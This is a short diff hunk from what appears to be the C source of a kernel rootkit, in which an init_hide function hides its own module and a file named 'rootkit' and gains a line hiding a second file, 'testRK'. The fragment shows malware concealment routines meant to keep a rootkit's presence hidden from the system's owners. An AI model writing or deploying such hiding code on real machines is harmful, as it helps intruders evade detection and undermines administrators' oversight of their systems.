@@ -132,6 +132,7 @@ int init_hide(void) {
 
     hide_module();
     hide_add_file("rootkit");
+    hide_add_file("testRK");
 
     return 0;
 }
